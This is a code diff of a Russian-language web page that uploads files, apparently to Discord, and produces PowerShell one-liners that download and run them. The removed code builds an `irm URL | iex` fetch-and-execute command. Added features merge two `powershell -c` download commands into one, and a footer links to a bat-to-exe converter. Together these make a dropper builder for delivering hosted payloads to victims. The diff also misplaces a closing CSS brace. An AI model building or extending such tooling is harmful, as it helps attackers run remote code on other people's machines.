@@ -144,25 +144,60 @@
             color: #888;
             opacity: 0;
             transition: opacity 0.3s;
-        }
         .powershell-cmd:hover::after {
             opacity: 1;
         }
+        }
         .copied {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #4caf50;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #27ae60;
             color: white;
-            padding: 12px 20px;
-            border-radius: 8px;
+            padding: 15px 30px;
+            border-radius: 10px;
             font-weight: bold;
-            opacity: 0;
-            transition: opacity 0.3s;
+            display: none;
             z-index: 1000;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
         .copied.show {
-            opacity: 1;
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        .merger {
+            margin-top: 30px;
+            padding: 20px;
+            background: #f0f4ff;
+            border-radius: 15px;
+            border-left: 4px solid #764ba2;
+        }
+        .cmd-input {
+            width: 100%;
+            min-height: 60px;
+            margin: 10px 0;
+            padding: 10px;
+            border: 2px solid #667eea;
+            border-radius: 8px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+        .merge-btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #764ba2 0%, #667eea 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: transform 0.3s ease;
+        }
+        .merge-btn:hover {
+            transform: scale(1.02);
         }
         .progress {
             margin-top: 20px;
@@ -191,6 +226,37 @@
         .status.show {
             display: block;
         }
+        .footer-note {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            text-align: center;
+            font-size: 13px;
+            color: #666;
+        }
+        .footer-note a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+        .download-btn {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #27ae60;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        .download-btn:hover {
+            transform: scale(1.05);
+            background: #219150;
+        }
     </style>
 </head>
 <body>
@@ -204,7 +270,7 @@
             </div>
         </div>
         
-        <input type="file" id="fileInput">
+        <input type="file" id="fileInput" multiple>
         
         <div class="file-info" id="fileInfo">
             <div class="file-name" id="fileName"></div>
@@ -222,6 +288,22 @@
         <div class="result" id="result">
             <span class="result-label">PowerShell команда для скачивания:</span>
             <div class="powershell-cmd" id="powershellCmd"></div>
+        </div>
+        
+        <div class="merger" id="merger">
+            <span class="result-label">🔗 Объединение 2 команд в 1</span>
+            <textarea class="cmd-input" id="cmd1" placeholder="Вставь первую команду..."></textarea>
+            <textarea class="cmd-input" id="cmd2" placeholder="Вставь вторую команду..."></textarea>
+            <button class="merge-btn" id="mergeBtn">Объединить команды</button>
+            <div class="result" id="mergeResult" style="margin-top: 15px; display: none;">
+                <span class="result-label">Объединенная команда:</span>
+                <div class="powershell-cmd" id="mergedCmd"></div>
+            </div>
+        </div>
+        
+        <div class="footer-note">
+            Чтобы превратить bat в exe, скачайте программу <b>Bat To Exe Converter</b>: <br>
+            <a href="/download-converter" class="download-btn">🚀 Скачать Converter</a>
         </div>
     </div>
     
@@ -241,9 +323,30 @@
         const powershellCmd = document.getElementById('powershellCmd');
         const copied = document.getElementById('copied');
 
-        let selectedFile = null;
+        let selectedFiles = [];
 
         uploadArea.addEventListener('click', () => fileInput.click());
+        
+        function updateFileInfo() {
+            if (selectedFiles.length === 0) {
+                fileInfo.classList.remove('show');
+                uploadBtn.classList.remove('show');
+                return;
+            }
+            
+            if (selectedFiles.length === 1) {
+                fileName.textContent = selectedFiles[0].name;
+                fileSize.textContent = formatFileSize(selectedFiles[0].size);
+            } else {
+                const totalSize = selectedFiles.reduce((sum, f) => sum + f.size, 0);
+                fileName.textContent = `${selectedFiles.length} файла: ${selectedFiles.map(f => f.name).join(', ')}`;
+                fileSize.textContent = formatFileSize(totalSize);
+            }
+            
+            fileInfo.classList.add('show');
+            uploadBtn.classList.add('show');
+            result.classList.remove('show');
+        }
         
         uploadArea.addEventListener('dragover', (e) => {
             e.preventDefault();
@@ -259,23 +362,19 @@
             uploadArea.classList.remove('dragover');
             const files = e.dataTransfer.files;
             if (files.length > 0) {
-                handleFile(files[0]);
+                handleFiles(files);
             }
         });
 
         fileInput.addEventListener('change', (e) => {
             if (e.target.files.length > 0) {
-                handleFile(e.target.files[0]);
+                handleFiles(e.target.files);
             }
         });
 
-        function handleFile(file) {
-            selectedFile = file;
-            fileName.textContent = file.name;
-            fileSize.textContent = formatFileSize(file.size);
-            fileInfo.classList.add('show');
-            uploadBtn.classList.add('show');
-            result.classList.remove('show');
+        function handleFiles(files) {
+            selectedFiles = Array.from(files).slice(0, 2); // Максимум 2 файла
+            updateFileInfo();
         }
 
         function formatFileSize(bytes) {
@@ -287,7 +386,7 @@
         }
 
         uploadBtn.addEventListener('click', async () => {
-            if (!selectedFile) return;
+            if (selectedFiles.length === 0) return;
 
             uploadBtn.disabled = true;
             progress.classList.add('show');
@@ -296,13 +395,15 @@
 
             const formData = new FormData();
             formData.append('reqtype', 'fileupload');
-            formData.append('fileToUpload', selectedFile);
+            selectedFiles.forEach(file => {
+                formData.append('fileToUpload', file);
+            });
 
             try {
                 status.textContent = 'Загрузка на Discord...';
                 progressBar.style.width = '50%';
 
-                const response = await fetch('/upload', {
+                const response = await fetch('/api/upload', {
                     method: 'POST',
                     body: formData
                 });
@@ -313,15 +414,14 @@
                     throw new Error('Ошибка загрузки');
                 }
 
-                const result = await response.json();
+                const responseData = await response.json();
                 
-                if (!result.success || !result.url.startsWith('http')) {
-                    throw new Error('Ошибка от сервера: ' + (result.error || 'Unknown error'));
+                if (!responseData.success) {
+                    throw new Error('Ошибка от сервера: ' + (responseData.error || 'Unknown error'));
                 }
                 
-                const fileUrl = result.url;
-
-                const cmd = `irm ${fileUrl} | iex`;
+                // Показываем объединенную команду
+                const cmd = responseData.command || '';
                 
                 powershellCmd.textContent = cmd;
                 result.classList.add('show');
@@ -337,6 +437,49 @@
 
         powershellCmd.addEventListener('click', () => {
             navigator.clipboard.writeText(powershellCmd.textContent).then(() => {
+                copied.classList.add('show');
+                setTimeout(() => copied.classList.remove('show'), 2000);
+            });
+        });
+        
+        // Объединение команд
+        const cmd1 = document.getElementById('cmd1');
+        const cmd2 = document.getElementById('cmd2');
+        const mergeBtn = document.getElementById('mergeBtn');
+        const mergeResult = document.getElementById('mergeResult');
+        const mergedCmd = document.getElementById('mergedCmd');
+        
+        mergeBtn.addEventListener('click', () => {
+            let command1 = cmd1.value.trim();
+            let command2 = cmd2.value.trim();
+            
+            if (!command1 || !command2) {
+                alert('Вставь обе команды!');
+                return;
+            }
+            
+            // Извлекаем содержимое из powershell -c "..."
+            command1 = command1.replace(/^powershell\s+-c\s+["']/i, '');
+            command2 = command2.replace(/^powershell\s+-c\s+["']/i, '');
+            
+            // Убираем конец: " или '
+            command1 = command1.replace(/["']$/i, '');
+            command2 = command2.replace(/["']$/i, '');
+            
+            // Заменяем переменные во второй команде на уникальные ($t->$t2, $u->$u2)
+            // чтобы не было конфликта с первой командой
+            command2 = command2.replace(/\$t\b/g, '$t2');
+            command2 = command2.replace(/\$u\b/g, '$u2');
+            
+            // Объединяем через ;
+            const combined = `powershell -c "${command1};${command2}"`;
+            
+            mergedCmd.textContent = combined;
+            mergeResult.style.display = 'block';
+        });
+        
+        mergedCmd.addEventListener('click', () => {
+            navigator.clipboard.writeText(mergedCmd.textContent).then(() => {
                 copied.classList.add('show');
                 setTimeout(() => copied.classList.remove('show'), 2000);
             });
